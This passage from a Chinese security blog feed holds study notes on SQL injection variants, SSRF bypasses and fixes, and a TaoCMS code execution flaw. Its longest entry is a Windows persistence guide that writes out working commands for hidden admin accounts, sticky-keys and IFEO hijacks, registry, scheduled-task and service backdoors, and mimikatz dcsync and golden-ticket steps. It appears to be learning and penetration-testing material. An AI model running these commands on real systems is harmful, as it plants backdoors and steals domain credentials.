<li><h2 id="base64注入攻击"><a href="#base64注入攻击" class="headerlink" title="base64注入攻击"></a>base64注入攻击</h2><ul>
<li><p>如果遇到url的参数id的值看起来像base64的，先拿去url解码，然后如果是base64，拿去base64解码，解出来的应该就是id的值（1，2等数字）；</p>
</li>
<li><p>那么如果要对这个url进行sql注入测试，就需要对id后面的所有值进行base64编码；</p>
</li>
<li><p>注入的方式步骤都是跟union注入一样的，只不过后面的所有值（整个payload）都要进行base64编码后传给url的c参数提交，包括闭合规则。</p>
</li>
</ul>
</li>
<li><h2 id="HTTP请求头参数注入-cookie注入攻击"><a href="#HTTP请求头参数注入-cookie注入攻击" class="headerlink" title="HTTP请求头参数注入-cookie注入攻击"></a>HTTP请求头参数注入-cookie注入攻击</h2><ul>
<li><p>抓包对一个url的http请求头的所有参数进行sql注入测试，里面的所有参数都有可能存在注入点，如果响应包出现sql报错，那么测试的这个参数就是注入点；</p>
</li>
<li><p>常见的http头部注入的参数有：【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】如果测试到cookie参数的时候，响应有报sql错误，那么就是cookie注入攻击；</p>
</li>
<li><p>和union注入的差别就在于注入点不一样，之后使用union注入的方法即可。</p>
</li>
</ul>
</li>
<li><h2 id="HTTP请求头参数注入-XFF注入攻击"><a href="#HTTP请求头参数注入-XFF注入攻击" class="headerlink" title="HTTP请求头参数注入-XFF注入攻击"></a>HTTP请求头参数注入-XFF注入攻击</h2><ul>
<li><p>XFF注入即HTTP头部的X-Forwarded-for参数存在sql注入；</p>
</li>
<li><p>例如测试此参数的值  X-Forwarded-for:127.0.0.1’  响应有sql报错，那么此处就是注入点；</p>
</li>
<li><p>之后使用union注入的方法完成即可。</p>
</li>
</ul>
</li>
</ul>
<h1 id="SQL注入修复方案"><a href="#SQL注入修复方案" class="headerlink" title="SQL注入修复方案"></a>SQL注入修复方案</h1><ul>
<li><p>解决SQL注入问题的关键是对所有可能来自用户输入的数据进行严格的检查、对数据库配置使用最小权限原则。</p>
</li>
<li><p>1、所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p>
</li>
<li><p>2、对进入数据库的特殊字符（’”\，括号&amp;*;等）进行转义处理，或编码转换。</p>
</li>
<li><p>3、严格限制变量类型，比如整型变量就采用intval()函数过滤，数据库中的存储字段必须对应为int型。</p>
</li>
<li><p>4、数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。</p>
</li>
<li><p>5、网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。</p>
</li>
<li><p>6、严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。</p>
</li>
<li><p>7、避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p>
</li>
<li><p>8、在网站发布之前建议使用一些专业的SQL注入检测工具进行检测，及时修补这些SQL注入漏洞。</p>
</li>
<li><p>9、确认PHP配置文件中的magicquotesgpc选项保持开启</p>
</li>
<li><p>10、配置安全狗，阿里云盾，等网络安全公司的产品</p>
</li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF服务器端请求伪造</title>
    <url>/2022/03/08/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>SSRF服务器端请求伪造是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。<span id="more"></span>（正是因为 它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。</p>
<h2 id="可实现攻击"><a href="#可实现攻击" class="headerlink" title="可实现攻击"></a>可实现攻击</h2><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>	可以对服务器所在内网、本地进行端口扫描，获取一些服务的banner信息<span class="comment">;</span></span><br><span class="line"><span class="number">2</span>	攻击运行在内网或本地的应用程序（比如溢出）<span class="comment">;</span></span><br><span class="line"><span class="number">3</span>	对内网web应用进行指纹识别，通过访问默认文件实现<span class="comment">;</span></span><br><span class="line"><span class="number">4</span>	攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）<span class="comment">;</span></span><br><span class="line"><span class="number">5</span>	利用file协议读取本地文件等。</span><br></pre></td></tr></table></figure>

<h2 id="可能出现的地方"><a href="#可能出现的地方" class="headerlink" title="可能出现的地方"></a>可能出现的地方</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>社交分享功能：获取超链接的标题等内容进行显示</span><br><span class="line"><span class="number">2.</span>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</span><br><span class="line"><span class="number">3.</span>在线翻译：给网址翻译对应网页的内容</span><br><span class="line"><span class="number">4.</span>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</span><br><span class="line"><span class="number">5.</span>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</span><br><span class="line"><span class="number">6.</span>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</span><br><span class="line"><span class="number">7.</span>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</span><br><span class="line"><span class="number">8.</span>数据库内置功能：数据库的比如mongodb的copyDatabase函数</span><br><span class="line"><span class="number">9.</span>邮件系统：比如接收邮件服务器地址</span><br><span class="line"><span class="number">10.</span>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，<span class="type">xml</span>处理器等</span><br><span class="line"><span class="number">11.</span>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞 一些的url中的关键字：<span class="keyword">share</span>、wap、url、link、src、source、target、u、<span class="number">3</span>g、display、sourceURl、imageURL、<span class="keyword">domain</span>……</span><br><span class="line"><span class="number">12.</span>从远程服务器请求资源（upload <span class="keyword">from</span> url 如discuz！；<span class="keyword">import</span> &amp; expost rss feed 如web blog；使用了<span class="type">xml</span>引擎对象的地方 如wordpress xmlrpc.php）</span><br></pre></td></tr></table></figure>

<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">1.让服务端去访问相应的网址</span><br><span class="line">2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</span><br><span class="line">3.可以使用<span class="meta">file</span>、dict、gopher[11]、ftp协议进行请求访问相应的文件</span><br><span class="line">4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包&#123;payload&#125;）</span><br><span class="line">5.攻击内网应用程序（利用跨协议通信技术）</span><br><span class="line">6.判断内网主机是否存活：方法是访问看是否有端口开放</span><br><span class="line">7.DoS攻击（请求大文件，始终保持连接<span class="meta">keep</span>-alive always）</span><br></pre></td></tr></table></figure>

<h2 id="限制绕过"><a href="#限制绕过" class="headerlink" title="限制绕过"></a>限制绕过</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.http:<span class="regexp">//</span>baidu.com@www.baidu.com<span class="regexp">/与http:/</span><span class="regexp">/www.baidu.com/</span>请求时是相同的</span><br><span class="line"><span class="number">2</span>.各种IP地址的进制转换</span><br><span class="line"><span class="number">3</span>.URL跳转绕过：http:<span class="regexp">//</span>www.hackersb.cn<span class="regexp">/redirect.php?url=http:/</span><span class="regexp">/192.168.0.1/</span></span><br><span class="line"><span class="number">4</span>.短网址绕过http:<span class="regexp">//</span>t.cn/RwbLKDx </span><br><span class="line"><span class="number">5</span>.xip.io来绕过：http:<span class="regexp">//</span>xxx.<span class="number">192.168</span>.<span class="number">0.1</span>.xip.io/== <span class="number">192.168</span>.<span class="number">0.1</span> (xxx 任意） 指向任意ip的域名：xip.io(<span class="number">37</span>signals开发实现的定制DNS服务)</span><br><span class="line"><span class="number">6</span>.限制了子网段，可以加 :<span class="number">80</span> 端口绕过。http:<span class="regexp">//</span>tieba.baidu.com<span class="regexp">/f/</span>commit<span class="regexp">/share/</span>openShareApi?url=http:<span class="regexp">//</span><span class="number">10.42</span>.<span class="number">7.78</span>:<span class="number">80</span></span><br><span class="line"><span class="number">7</span>.探测内网域名，或者将自己的域名解析到内网ip</span><br><span class="line"><span class="number">8</span>.例如http:<span class="regexp">//</span><span class="number">10.153</span>.<span class="number">138.81</span><span class="regexp">/ts.php, 修复时容易出现的获取host时以/</span>分割来确定host， 但这样可以用http:<span class="regexp">//</span>abc@<span class="number">10.153</span>.<span class="number">138.81</span>/绕过</span><br></pre></td></tr></table></figure>

<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>	过滤内网服务器对公网服务器请求的响应。如果Web应用是获取某一类型的文件，在把返回结果展示给用户之前应先验证返回的信息是否符合文件类型标准，比如返回信息应为图片，如果返回信息是HTML，则停止将返回信息返回客户端。</span><br><span class="line"><span class="attribute">2</span>	统一错误提示信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</span><br><span class="line"><span class="attribute">3</span>	在内网服务器的防火墙上限制公网服务器的请求端口为HTTP等协议常用端口，如：<span class="number">80</span>、<span class="number">443</span>、<span class="number">8080</span>、<span class="number">8090</span>。</span><br><span class="line"><span class="attribute">4</span>	若公网服务器的内网IP与内网无业务通信，建议将公网服务器对应的内网IP列入黑名单，避免应用被用来获取内网数据。</span><br><span class="line"><span class="attribute">5</span>	内网服务器禁用不必要的协议，仅允许HTTP和HTTPS请求，防止类似于file:///、gopher://、ftp:// 等协议引起的安全问题。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>TaoCMS存在代码执行漏洞</title>
    <url>/2022/03/08/TaoCMS%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h1><p>TaoCMS是基于php+sqlite/mysql的国内最小(100Kb左右)的功能完善的CMS管理系统taoCMS-基于php+sqlite最小巧的CMS，TaoCMS系统存在代码执行漏洞，可以执行任意php文件。</p>
<span id="more"></span>
<h1 id="二、-漏洞细节"><a href="#二、-漏洞细节" class="headerlink" title="二、 漏洞细节"></a>二、 漏洞细节</h1><p>在include\Model\File.php 55行edit()代码,代码可以看出可以编辑任意文件，包括php文件。</p>
<p><img src="https://ax-x.github.io/2022/03/08/TaoCMS%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220830155608718.png" alt="image-20220830155608718"></p>
<p>而save()保存函数，对文件没有进行任何验证便保存下来，造成代码执行漏洞。</p>
<p> <img src="https://ax-x.github.io/2022/03/08/TaoCMS%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220830155816381.png" alt="image-20220830155816381"></p>
<h1 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3 漏洞利用"></a>3 漏洞利用</h1><p>漏洞验证：</p>
<p>首先进入后台，点击文件管理。</p>
<p> <img src="https://ax-x.github.io/2022/03/08/TaoCMS%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220830155826832.png" alt="image-20220830155826832"></p>
<p>在api.php文件后面点编辑，并在第一行添加代码 phpinfo();</p>
<p> <img src="https://ax-x.github.io/2022/03/08/TaoCMS%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220830155840712.png" alt="image-20220830155840712"></p>
<p>保存后访问api.php,成功执行代码。</p>
<p> <img src="https://ax-x.github.io/2022/03/08/TaoCMS%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220830155849238.png" alt="image-20220830155849238"></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>PHP代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows权限维持总结</title>
    <url>/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h4 id="一、影子账户"><a href="#一、影子账户" class="headerlink" title="一、影子账户"></a><strong>一、影子账户</strong></h4><p>1.使用如下命令创建隐藏用户并加入管理员组</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user test<span class="variable">$</span> <span class="number">123456</span> /addnet localgroup administrators test<span class="variable">$</span> /add</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>创建成功后使用net user命令无法查看到此用户，但是在计算机管理页面中还是可以看到，需要通过修改注册表来隐藏。</p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640.webp" alt="图片"></p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027220114.webp" alt="图片"></p>
<p>2.打开注册表（HKEY_LOCAL_MACHINE\SAM\SAM）</p>
<p>修改SAM权限，赋予adminitrators完全控制权限。</p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027221115.webp" alt="图片"></p>
<p>3.将Administrator用户对应项的F数据值复制到test$用户对应项的F数据值。</p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027221116.webp" alt="图片"></p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222117.webp" alt="图片"></p>
<p>4.将test$和所对应项000003F1导出，分别命名为test.reg和1.reg</p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222118.webp" alt="图片"></p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222119.webp" alt="图片"></p>
<p>5.删除test$用户，将test.reg和1.reg导入注册表</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user test<span class="variable">$</span> /delregedit /s test.regregedit /s <span class="number">1</span>.reg</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222120.webp" alt="图片"></p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222121.webp" alt="图片"></p>
<p>6.此时在用户组已经看不到test$用户，只能在注册表中能看到。</p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222122.webp" alt="图片"></p>
<h4 id="二、粘滞键后门"><a href="#二、粘滞键后门" class="headerlink" title="二、粘滞键后门"></a><strong>二、粘滞键后门</strong></h4><p>粘滞键指的是电脑使用中的一种快捷键，专为同时按下两个或多个键有困难的人而设计的。粘滞键的主要功能是方便Shift等键的组合使用。一般的电脑连按五次shift会出现粘滞键提示。</p>
<p><strong>演示：</strong></p>
<p>粘滞键位置：c:\windows\system32\sethc.exe</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">move</span> sethc.exe sethc1.execopy cmd.exe sethc.exe</span><br></pre></td></tr></table></figure>

<p>此时连按五次shift键即可启动cmd，而且不需要登录就可以执行。</p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222123.webp" alt="图片"></p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222124.webp" alt="图片"></p>
<h4 id="三、logon-scripts后门"><a href="#三、logon-scripts后门" class="headerlink" title="三、logon scripts后门"></a><strong>三、logon scripts后门</strong></h4><p>Windows登录脚本，当用户登录时触发，Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截。</p>
<p><strong>演示：</strong></p>
<p>注册表位置：HKEY_CURRENT_USER\Environment</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKEY_CURRENT_USER\Environment&quot;</span> /v UserInitMprLogonScript /t REG_SZ /d <span class="string">&quot;C:\666.exe&quot;</span>    </span><br><span class="line"><span class="comment">#创建键为：UserInitMprLogonScript，其键值为我们要启动的程序路径</span></span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222125.webp" alt="图片"></p>
<p>重启，上线成功。</p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222126.webp" alt="图片"></p>
<h4 id="四、映像劫持"><a href="#四、映像劫持" class="headerlink" title="四、映像劫持"></a><strong>四、映像劫持</strong></h4><p>“映像劫持”，也被称为“IFEO”（Image File Execution Options），在WindowsNT架构的系统里，IFEO的本意是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。当一个可执行程序位于IFEO的控制中时，它的内存分配则根据该程序的参数来设定，而WindowsN T架构的系统能通过这个注册表项使用与可执行程序文件名匹配的项目作为程序载入时的控制依据，最终得以设定一个程序的堆管理机制和一些辅助机制等。出于简化原因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化，它就运行出问题。</p>
<p><strong>演示：</strong></p>
<p>注册表位置：HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\</p>
<p>在此注册表位置添加项sethc.exe，添加debugger键的值为c:\windows\system32\cmd.exe</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v <span class="string">&quot;Debugger&quot;</span> /t REG_SZ /d <span class="string">&quot;c:\windows\system32\cmd.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222127.webp" alt="图片"></p>
<p>此时点击五次shift键会打开cmd。</p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223128.webp" alt="图片"></p>
<h4 id="五、注册表自启动后门"><a href="#五、注册表自启动后门" class="headerlink" title="五、注册表自启动后门"></a><strong>五、注册表自启动后门</strong></h4><p>位置一：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</p>
<p>添加键test，值为后门程序路径。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span> /v test1 /t REG_SZ /d <span class="string">&quot;C:\666.exe&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223129.webp" alt="图片"></p>
<p>重新启动会自动运行后门程序。</p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223130.webp" alt="图片"></p>
<p>位置二：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</p>
<p>修改键Userinit的值，重启就会自动运行程序。</p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223131.png" alt="图片"></p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223132.webp" alt="图片"></p>
<h4 id="六、屏幕保护程序后门"><a href="#六、屏幕保护程序后门" class="headerlink" title="六、屏幕保护程序后门"></a><strong>六、屏幕保护程序后门</strong></h4><p>屏幕保护是Windows功能的一部分，使用户可以在一段时间不活动后放置屏幕消息或图形动画。Windows的此功能被威胁参与者滥用为持久性方法。这是因为屏幕保护程序是具有.scr文件扩展名的可执行文件，并通过scrnsave.scr实用程序执行。</p>
<p><strong>演示：</strong></p>
<p>注册表位置：HKEY_CURRENT_USER\Control Panel\Desktop</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">SCRNSAVE.EXE为默认的屏保程序，我们可将此键值设置为我们要利用的恶意程序。在本质上，.scr文件是可执行文件。ScreenSaveActive表示屏保状态，<span class="number">1</span>为启动，<span class="number">0</span>为关闭。ScreenSaverTimeout表示屏幕保护程序启动前系统的空闲事件，单位为秒，默认为<span class="number">900</span>(<span class="number">15</span>分钟)。ScreenSaverIsSecure默认参数为<span class="number">0</span>，标识不需要密码即可解锁。</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223133.webp" alt="图片"></p>
<p>修改SCRASAVE.EXE的值为后门程序路径，等待屏保时间自动运行。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot;</span> /v SCRNSAVE.EXE /t REG_SZ /d <span class="string">&quot;c:\666.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223134.webp" alt="图片"></p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223135.webp" alt="图片"></p>
<h4 id="七、计划任务后门"><a href="#七、计划任务后门" class="headerlink" title="七、计划任务后门"></a><strong>七、计划任务后门</strong></h4><p>schtasks命令设定计划自动启动后门程序。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">schtasks /Create /tn Updater /tr c:\<span class="number">666</span>.exe /<span class="built_in">sc</span> minute /mo <span class="number">5</span>  </span><br><span class="line"><span class="comment">#每5分钟自动执行666.exe</span></span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223136.webp" alt="图片"></p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224137.webp" alt="图片"></p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224138.webp" alt="图片"></p>
<h4 id="八、服务自启动后门"><a href="#八、服务自启动后门" class="headerlink" title="八、服务自启动后门"></a><strong>八、服务自启动后门</strong></h4><p>自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将exe文件注册为服务，也可以将dll文件注册为服务。</p>
<p><strong>演示：</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sc</span> create test binpath= c:\<span class="number">666</span>.exe    （注意等号后面有空格）</span><br><span class="line"><span class="comment">#创建服务sc config test start= auto</span></span><br><span class="line"><span class="comment">#设置服务为自动启动net start test                #启动服务</span></span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224139.webp" alt="图片"></p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224140.webp" alt="图片"></p>
<h4 id="九、黄金票据"><a href="#九、黄金票据" class="headerlink" title="九、黄金票据"></a><strong>九、黄金票据</strong></h4><p>在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个 Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的,所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。</p>
<p><strong>演示：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">利用条件：1.域sid2.域名称3.krbtgt ntlm <span class="built_in">hash</span>或aes256值</span><br></pre></td></tr></table></figure>

<p>未注入票据访问域控被拒绝。</p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224141.webp" alt="图片"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">查看krbtgt ntlm hash：lsadump::dcsync <span class="regexp">/domain:&lt;域名&gt; /u</span>ser:krbtgt</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224142.webp" alt="图片"></p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">清空票据信息：kerberos::purge</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224143.webp" alt="图片"></p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">生成票据：kerberos::golden /admin:<span class="params">&lt;用户名&gt;</span> /domain:<span class="params">&lt;域名&gt;</span> /sid:<span class="params">&lt;域SID&gt;</span> /krbtgt:<span class="params">&lt;ntlm hash&gt;</span> /ticket:<span class="params">&lt;票据名&gt;</span></span><br><span class="line">导入票据：kerberos::ptt Administrator.kiribi</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224144.webp" alt="图片"></p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">导入票据：kerberos::ptt <span class="module-access"><span class="module"><span class="identifier">Administrator</span>.</span></span>kiribi</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224145.webp" alt="图片"></p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224146.webp" alt="图片"></p>
<p>票据注入成功。</p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224147.webp" alt="图片"></p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225148.webp" alt="图片"></p>
<p><strong>十、白银票据</strong></p>
